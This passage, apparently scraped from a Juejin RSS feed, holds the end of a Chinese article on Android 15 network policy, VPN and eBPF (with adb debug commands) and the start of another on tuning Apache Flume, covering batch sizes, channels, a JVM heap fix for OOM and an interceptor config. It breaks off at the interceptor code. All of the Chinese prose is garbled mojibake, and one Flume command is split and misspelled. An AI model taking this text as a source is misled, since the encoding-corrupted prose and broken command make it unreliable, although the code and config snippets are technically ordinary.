            <span class="hljs-comment">// - QoSä¼˜å…ˆçº§é«˜</span>
            bindProcessToNetwork(network);
        }
    });
}
</code></pre>
<h3 data-id="heading-47">4.2 å«æ˜Ÿè¿æ¥æ”¯æŒ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android 15 - æ£€æµ‹å«æ˜Ÿç½‘ç»œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSatelliteNetwork</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
        ConnectivityManager.class);

    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
        cm.getActiveNetwork());

    <span class="hljs-keyword">return</span> caps != <span class="hljs-literal">null</span> &amp;&amp;
           caps.hasTransport(TRANSPORT_SATELLITE);
}
</code></pre>
<h3 data-id="heading-48">4.3 eBPFæ€§èƒ½æå‡</h3>
<p>Android 15å…¨é¢ä½¿ç”¨eBPFæ›¿ä»£iptablesï¼š</p>
<ul>
<li><strong>æµé‡ç»Ÿè®¡</strong>ï¼šO(1)å¤æ‚åº¦</li>
<li><strong>é˜²ç«å¢™è§„åˆ™</strong>ï¼šå“ˆå¸ŒæŸ¥æ‰¾ï¼Œå»¶è¿Ÿé™ä½90%</li>
<li><strong>CPUå ç”¨</strong>ï¼šå‡å°‘60%</li>
</ul>
<hr/>
<h2 data-id="heading-49">äº”ã€æ€»ç»“ä¸å±•æœ›</h2>
<h3 data-id="heading-50">5.1 æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<ol>
<li>
<p><strong>NetworkPolicyæµé‡æ§åˆ¶</strong></p>
<ul>
<li>NetworkPolicyManagerServiceç®¡ç†ç½‘ç»œç­–ç•¥</li>
<li>Data Saverçœæµæ¨¡å¼</li>
<li>æµé‡ç»Ÿè®¡ä¸é™åˆ¶</li>
<li>eBPFæ€§èƒ½ä¼˜åŒ–</li>
</ul>
</li>
<li>
<p><strong>VPNæ¡†æ¶</strong></p>
<ul>
<li>VpnServiceåº”ç”¨å±‚å®ç°</li>
<li>TUNè™šæ‹Ÿç½‘å¡</li>
<li>è·¯ç”±é…ç½®ä¸æ•°æ®è½¬å‘</li>
<li>Always-on VPNæœºåˆ¶</li>
</ul>
</li>
<li>
<p><strong>ç½‘ç»œä¼˜åŒ–</strong></p>
<ul>
<li>å‹ç¼©ä¼ è¾“</li>
<li>DNSç¼“å­˜ä¸DoH</li>
<li>è¿æ¥æ± ç®¡ç†</li>
<li>æµé‡ç›‘æ§å·¥å…·</li>
</ul>
</li>
</ol>
<h3 data-id="heading-51">5.2 æœ€ä½³å®è·µå»ºè®®</h3>





























<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">å»ºè®®</th></tr></thead><tbody><tr><td align="left">çœæµä¼˜åŒ–</td><td align="left">ç›‘å¬Data SaverçŠ¶æ€ï¼ŒåŠ¨æ€è°ƒæ•´èµ„æºè´¨é‡</td></tr><tr><td align="left">VPNå¼€å‘</td><td align="left">ä½¿ç”¨TUNè€ŒéTAPï¼Œå¤„ç†å¥½å¼‚å¸¸é‡è¿</td></tr><tr><td align="left">åå°åŒæ­¥</td><td align="left">ä½¿ç”¨WorkManager + ç½‘ç»œçº¦æŸæ¡ä»¶</td></tr><tr><td align="left">å¤§æ–‡ä»¶ä¸‹è½½</td><td align="left">åˆ†æ®µä¸‹è½½ï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼ŒWiFiä¼˜å…ˆ</td></tr><tr><td align="left">å®æ—¶é€šä¿¡</td><td align="left">ä½¿ç”¨WebSocketä¿æŒé•¿è¿æ¥ï¼Œå¿ƒè·³ä¿æ´»</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-52">å…­ã€å‚è€ƒèµ„æº</h2>
<h3 data-id="heading-53">6.1 æºç è·¯å¾„</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># NetworkPolicy</span>
packages/modules/Connectivity/service/src/com/android/server/net/
â”œâ”€â”€ NetworkPolicyManagerService.java
â”œâ”€â”€ NetworkStatsService.java
â””â”€â”€ NetworkPolicyManagerInternal.java

<span class="hljs-comment"># VPN</span>
packages/modules/Connectivity/service/src/com/android/server/connectivity/
â”œâ”€â”€ Vpn.java
â””â”€â”€ VpnNetworkObserver.java

<span class="hljs-comment"># eBPF</span>
system/netd/bpf_progs/
â”œâ”€â”€ netd.c
â””â”€â”€ bpf_net_helpers.h
</code></pre>
<h3 data-id="heading-54">6.2 è°ƒè¯•å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç½‘ç»œç­–ç•¥</span>
adb shell dumpsys network_policy

<span class="hljs-comment"># æµé‡ç»Ÿè®¡</span>
adb shell dumpsys netstats

<span class="hljs-comment"># VPNçŠ¶æ€</span>
adb shell dumpsys connectivity | grep -A 20 <span class="hljs-string">"VPN"</span>

<span class="hljs-comment"># eBPFç»Ÿè®¡</span>
adb shell dumpsys connectivity trafficcontroller

<span class="hljs-comment"># è®¾ç½®Data Saver</span>
adb shell cmd netpolicy <span class="hljs-built_in">set</span> restrict-background <span class="hljs-literal">true</span>

<span class="hljs-comment"># æŸ¥çœ‹UIDç­–ç•¥</span>
adb shell cmd netpolicy list uid-policy
</code></pre>
<h3 data-id="heading-55">6.3 å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fnet%2FVpnService" target="_blank" title="https://developer.android.com/reference/android/net/VpnService" ref="nofollow noopener noreferrer">VpnService Guide</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fbasics%2Fnetwork-ops%2Fdata-saver" target="_blank" title="https://developer.android.com/training/basics/network-ops/data-saver" ref="nofollow noopener noreferrer">Data Saver Best Practices</a></li>
</ul>
<hr/>
<h2 data-id="heading-56">åè®°</h2>
<p>ç½‘ç»œç­–ç•¥å’ŒVPNæ˜¯Androidç½‘ç»œå­ç³»ç»Ÿä¸­æœ€å¤æ‚çš„ä¸¤ä¸ªæ¨¡å—ï¼Œå®ƒä»¬å…±åŒä¿éšœäº†ï¼š</p>
<ul>
<li><strong>ç”¨æˆ·éšç§</strong>ï¼šVPNåŠ å¯†ä¿æŠ¤æ•°æ®ä¼ è¾“</li>
<li><strong>æµé‡æ§åˆ¶</strong>ï¼šé˜²æ­¢åå°åº”ç”¨å·è·‘æµé‡</li>
<li><strong>ç”µé‡ä¼˜åŒ–</strong>ï¼šé™åˆ¶ä¸å¿…è¦çš„ç½‘ç»œæ´»åŠ¨</li>
<li><strong>å®‰å…¨éš”ç¦»</strong>ï¼šä¼ä¸šçº§ç½‘ç»œè®¿é—®æ§åˆ¶</li>
</ul>
<h3 data-id="heading-57">ç³»åˆ—æ–‡ç« </h3>
<ul>
<li><a href="https://juejin.cn/post/7600060691350405162" target="_blank" title="https://juejin.cn/post/7600060691350405162">ä¸Šä¸€ç¯‡ï¼šAndroid 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆä¸€ï¼‰ï¼šConnectivityServiceä¸ç½‘ç»œç®¡ç†æ¡†æ¶å…¨è§£æ</a></li>
</ul>
<hr/>
<p><em>æ¬¢è¿æ¥æˆ‘ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>æ‰¾åˆ°æ›´å¤šæœ‰ç”¨çš„çŸ¥è¯†å’Œæœ‰è¶£çš„äº§å“</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤]]></title>    <link>https://juejin.cn/post/7601007650722627625</link>    <guid>https://juejin.cn/post/7601007650722627625</guid>    <pubDate>2026-01-30T13:06:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722627625" data-draft-id="7600964907489460230" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,Apache Flume"/> <meta itemprop="datePublished" content="2026-01-30T13:06:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:06:40.000Z" title="Fri Jan 30 2026 13:06:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šç¦»çº¿æ•°ä»“é‡‡é›†æ—¥å¿—å†™å…¥ HDFSï¼ŒFlume Agent ååã€ç¨³å®šæ€§ä¸è½ç›˜åˆ†åŒºæ—¶é—´å‡†ç¡®æ€§éœ€è¦åŒæ—¶ä¿è¯</li>
<li>ç»“è®ºï¼šä¼˜å…ˆç”¨æ‰¹é‡å‚æ•°ä¸ Channel å®¹é‡/äº‹åŠ¡é…åˆæå‡ååï¼Œç”¨ JVM å †å‚æ•°è§£å†³ OOMï¼Œç”¨æ‹¦æˆªå™¨æŠŠä¸šåŠ¡æ—¶é—´å†™å…¥ header ä¿®æ­£åˆ†åŒºè·¯å¾„</li>
<li>äº§å‡ºï¼šå¯å¤ç”¨çš„ Flume 1.9.0 è°ƒä¼˜æ¸…å• + OOM é€Ÿä¿®å‘½ä»¤ + è‡ªå®šä¹‰ Interceptorï¼ˆlogtime headerï¼‰è½åœ°æ¨¡æ¿</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3d97f77496343d09c16b141f957d25d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=SP7uSvZn3cNPYjDqPoruTfNc9HU%3D" alt="å¤§æ•°æ®-226 ç¦»çº¿æ•°ä»“Flume ä¼˜åŒ–é…ç½®å®æˆ˜ï¼šbatchSize/Channel/å‹ç¼©/è‡ªå®šä¹‰æ‹¦æˆªå™¨ä¸ OOM ä¿®å¤" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaa267bad42548c9902abdbda8746372~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=mpsWZqpBOJzS0yK7Rv3m2X1Tgw8%3D" alt="ç¦»çº¿æ•°ä»“æ¶æ„å›¾" loading="lazy"/></p>
<h2 data-id="heading-1">Flumeçš„ä¼˜åŒ–é…ç½®</h2>
<p>Flume æ˜¯ä¸€ç§åˆ†å¸ƒå¼ã€å¯é ä¸”é«˜æ•ˆçš„æ•°æ®æ”¶é›†ã€èšåˆå’Œä¼ è¾“ç³»ç»Ÿï¼Œå¹¿æ³›åº”ç”¨äºå¤§æ•°æ®ç”Ÿæ€ç³»ç»Ÿä¸­ã€‚ä¸ºäº†æå‡ Flume çš„æ€§èƒ½å’Œç¨³å®šæ€§ï¼Œä¼˜åŒ–é…ç½®è‡³å…³é‡è¦ã€‚</p>
<p>ä½¿ç”¨å¦‚ä¸‹çš„æŒ‡ä»¤ï¼Œå¯åŠ¨Agentè¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">flume-ng agent --conf-file /opt/wzk/flume-conf/flume-log2hdfs1.conf -name a1 -Dflum
e.roog.logger=INFO,console
</code></pre>
<p>å¯åŠ¨åçš„æˆªå›¾å¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aae07ec211e4a13858f881ee1c5be2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=JOCWv0y6btJ3um%2Fq8MiOd5h2lAY%3D" alt="ç¦»çº¿æ•°ä»“Flumeå¯åŠ¨" loading="lazy"/></p>
<p>æŸ¥çœ‹åˆšæ‰çš„Flumeçª—å£ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3dd8c226b17487d8114d3bce1656863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=SGMi36RywTLV%2F0n23VLvNgjkunU%3D" alt="ç¦»çº¿æ•°ä»“Flumeæ—¥å¿—" loading="lazy"/></p>
<p>æŸ¥çœ‹HDFSçš„å†…å®¹ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c798bd4cc37540f581aaed1a0852d835~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=nScgFdIfyY0v8HPmczsbZ5J2TMk%3D" alt="ç¦»çº¿æ•°ä»“ HDFS å†…å®¹" loading="lazy"/></p>
<h3 data-id="heading-2">æ‰¹é‡å¤„ç†</h3>
<ul>
<li>å‚æ•°ï¼šbatchSize</li>
<li>ä½œç”¨ï¼šæ§åˆ¶ Flume åœ¨æ‰¹é‡ä¼ è¾“æ—¶æ¯æ¬¡ä¼ è¾“çš„äº‹ä»¶æ•°é‡ã€‚
é…ç½®å»ºè®®ï¼š</li>
<li>Source åˆ° Channelï¼šæ ¹æ® Source çš„ååé‡å’Œ Channel çš„ååèƒ½åŠ›è°ƒæ•´ï¼Œæ¨èå€¼ä¸º 100-1000ã€‚</li>
<li>Channel åˆ° Sinkï¼šæ ¹æ® Sink çš„å¤„ç†èƒ½åŠ›å’Œç›®æ ‡ç³»ç»Ÿçš„å†™å…¥æ€§èƒ½è°ƒæ•´ï¼Œæ¨èå€¼ä¸º 500-5000ã€‚</li>
</ul>
<h3 data-id="heading-3">å‹ç¼©ä¼ è¾“</h3>
<ul>
<li>å‚æ•°ï¼šcompressionType</li>
<li>ä½œç”¨ï¼šå¯¹äº‹ä»¶è¿›è¡Œå‹ç¼©åä¼ è¾“ï¼Œå‡å°‘ç½‘ç»œå¸¦å®½æ¶ˆè€—ã€‚</li>
<li>æ”¯æŒçš„å‹ç¼©ç±»å‹ï¼šgzipã€snappyã€lz4 ç­‰ã€‚</li>
<li>é…ç½®å»ºè®®ï¼šæ ¹æ®ç›®æ ‡ç³»ç»Ÿæ˜¯å¦æ”¯æŒè§£å‹ç¼©åŠŸèƒ½é€‰æ‹©åˆé€‚çš„å‹ç¼©ç±»å‹ã€‚</li>
</ul>
<h3 data-id="heading-4">Source ä¼˜åŒ–</h3>
<h4 data-id="heading-5">Taildir Source</h4>
<ul>
<li>å‚æ•°ï¼šbatchSize å’Œ fileHeader</li>
<li>batchSizeï¼šè®¾ç½®å•æ¬¡ä»æ–‡ä»¶ä¸­è¯»å–çš„äº‹ä»¶æ•°é‡ã€‚</li>
<li>fileHeaderï¼šæ˜¯å¦åœ¨äº‹ä»¶å¤´éƒ¨æ·»åŠ æ–‡ä»¶åï¼Œæ¨èå¼€å¯ä»¥ä¾¿äºåç»­å¤„ç†ã€‚</li>
</ul>
<h4 data-id="heading-6">Kafka Source</h4>
<ul>
<li>å‚æ•°ï¼škafka.consumer.timeout.ms å’Œ fetch.message.max.bytes</li>
<li>kafka.consumer.timeout.msï¼šè®¾ç½® Kafka æ¶ˆè´¹è€…è¯»å–æ•°æ®çš„è¶…æ—¶æ—¶é—´ï¼Œé€šå¸¸ä¸º 100-500msã€‚</li>
<li>fetch.message.max.bytesï¼šè®¾ç½®æ¯æ¬¡è¯»å–çš„æœ€å¤§æ¶ˆæ¯å¤§å°ï¼Œé»˜è®¤å€¼é€šå¸¸ä¸º 1MBï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡åœºæ™¯é€‚å½“è°ƒæ•´ã€‚</li>
</ul>
<h3 data-id="heading-7">Channel ä¼˜åŒ–</h3>
<h4 data-id="heading-8">Memory Channel</h4>
<ul>
<li>å‚æ•°ï¼šcapacity å’Œ transactionCapacity</li>
<li>capacityï¼šChannel ä¸­å…è®¸çš„æœ€å¤§äº‹ä»¶æ•°ã€‚</li>
<li>transactionCapacityï¼šå•æ¬¡äº‹åŠ¡ä¸­å…è®¸çš„æœ€å¤§äº‹ä»¶æ•°ã€‚</li>
</ul>
<h4 data-id="heading-9">File Channel</h4>
<ul>
<li>å‚æ•°ï¼šcheckpointDir å’Œ dataDirs</li>
<li>checkpointDirï¼šå­˜å‚¨ Channel çŠ¶æ€çš„ç›®å½•ã€‚</li>
<li>dataDirsï¼šå­˜å‚¨äº‹ä»¶æ•°æ®çš„ç›®å½•ï¼Œå»ºè®®è®¾ç½®å¤šä¸ªç£ç›˜è·¯å¾„ä»¥æå‡ IO æ€§èƒ½ã€‚</li>
<li>é…ç½®å»ºè®®ï¼šç¡®ä¿ç£ç›˜ IO æ€§èƒ½è¶³å¤Ÿï¼Œé¿å…ç“¶é¢ˆã€‚</li>
</ul>
<h2 data-id="heading-10">FlumeæŠ¥é”™è§£å†³</h2>
<p>å‘ logs ç›®å½•ä¸­å­˜æ”¾å…¥æ—¥å¿—æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æœå‡ºç°OOMçš„æ—¥å¿—ï¼Œæ˜¯å› ä¸ºç¼ºçœæƒ…å†µä¸‹FlumeJVMçš„æœ€å¤§åˆ†é…20Mï¼Œè¿™ä¸ªå€¼å¤ªå°ï¼Œéœ€è¦è°ƒæ•´ã€‚
æˆ‘è¿™é‡Œç›´æ¥æ”¾å…¥ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">vim /opt/wzk/logs/start/test.log

2020-07-30 14:18:47.339 [main] INFO com.ecommerce.AppStart - {"app_active":{"name":"app_active","json":{"entry":"1","action":"1","error_code":"0"},"time":1596111888529},"attr":{"area":"æ³°å®‰","uid":"2F10092A9","app_v":"1.1.13","event_type":"common","device_id":"1FB872-9A1009","os_type":"4.7.3","channel":"DK","language":"chinese","brand":"iphone-9"}}

</code></pre>
<p>è§£å†³æ–¹æ¡ˆï¼š
åœ¨ $FLUME_HOME/conf/flume-env.sh ä¸­å¢åŠ ä»¥ä¸‹å†…å®¹:</p>
<pre><code class="hljs language-shell" lang="shell">export JAVA_OPTS="-Xms4000m -Xmx4000m -
Dcom.sun.management.jmxremote"
<span class="hljs-meta prompt_"># </span><span class="bash">è¦æƒ³ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼Œè¿˜è¦åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šé…ç½®æ–‡ä»¶ç›®å½•</span>
flume-ng agent --conf flume-1.9/conf --conf-file flume-log2hdfs1.conf -name a1 -Dflume.root.logger=INFO,console

flume-ng agent --conf-file flume-log2hdfs1.conf -name a1 -Dflume.root.logger=INFO,console
</code></pre>
<p>Flumeå†…å­˜å‚æ•°è®¾ç½®åŠä¼˜åŒ–ï¼š</p>
<ul>
<li>æ ¹æ®æ—¥å¿—æ•°æ®é‡å¤§å°ï¼ŒJVMå †ä¸€èˆ¬è¦è®¾ç½®ä¸º4Gæˆ–è€…æ›´é«˜</li>
<li>-Xms -Xmxæœ€å¥½è®¾ç½®ä¸€è‡´ï¼Œå‡å°‘å†…å­˜æŠ–åŠ¨å¸¦æ¥çš„æ€§èƒ½å½±å“</li>
</ul>
<h2 data-id="heading-11">è‡ªå®šä¹‰æ‹¦æˆªå™¨</h2>
<p>å‰é¢FlumeAgentçš„é…ç½®ä½¿ç”¨äº†æœ¬åœ°æ—¶é—´ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®å­˜æ”¾çš„è·¯å¾„ä¸æ­£ç¡®ã€‚è¦è§£å†³ä¸Šé¢çš„é—®é¢˜å°±éœ€è¦ä½¿ç”¨è‡ªå®šä¹‰æ‹¦æˆªå™¨ã€‚
Agentç”¨äºæµ‹è¯•è‡ªå®šä¹‰æ‹¦æˆªå™¨ï¼Œsource =&gt; logger sink
flumetest1.conf</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">a1æ˜¯agentçš„åç§°ã€‚<span class="hljs-built_in">source</span>ã€channelã€sinkçš„åç§°åˆ†åˆ«ä¸ºï¼šr1 c1 k1</span>
a1.sources = r1
a1.channels = c1
a1.sinks = k1
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">source</span></span>
a1.sources.r1.type = netcat
a1.sources.r1.bind = h122.wzk.icu
a1.sources.r1.port = 9999
a1.sources.r1.interceptors = i1
a1.sources.r1.interceptors.i1.type = icu.wzk.CustomerInterceptor$Builder
<span class="hljs-meta prompt_"># </span><span class="bash">channel</span>
a1.channels.c1.type = memory
a1.channels.c1.capacity = 10000
a1.channels.c1.transactionCapacity = 100
<span class="hljs-meta prompt_"># </span><span class="bash">sink</span>
a1.sinks.k1.type = logger
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">source</span>ã€channelã€sinkä¹‹é—´çš„å…³ç³»</span>
a1.sources.r1.channels = c1
a1.sinks.k1.channel = c1
</code></pre>
<h3 data-id="heading-12">è‡ªå®šä¹‰æ‹¦æˆªå™¨åŸç†</h3>
<p>è‡ªå®šä¹‰æ‹¦æˆªå™¨çš„åŸç†ï¼š</p>
<ul>
<li>è‡ªå®šä¹‰æ‹¦æˆªå™¨è¦é›†æˆ Flume çš„ Interceptor</li>
<li>Event åˆ†ä¸º header å’Œ body ï¼ˆæ¥æ”¶çš„å­—ç¬¦ä¸²ï¼‰</li>
<li>è·å– header å’Œ body</li>
<li>ä» body ä¸­ è·å– timeï¼Œå¹¶å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºå­—ç¬¦ä¸² yyyy-MM-dd</li>
<li>å°†è½¬æ¢åçš„å­—ç¬¦ä¸²æ”¾ç½®åˆ°headerä¸­</li>
</ul>
<h3 data-id="heading-13">è‡ªå®šä¹‰æ‹¦æˆªå™¨å®ç°</h3>
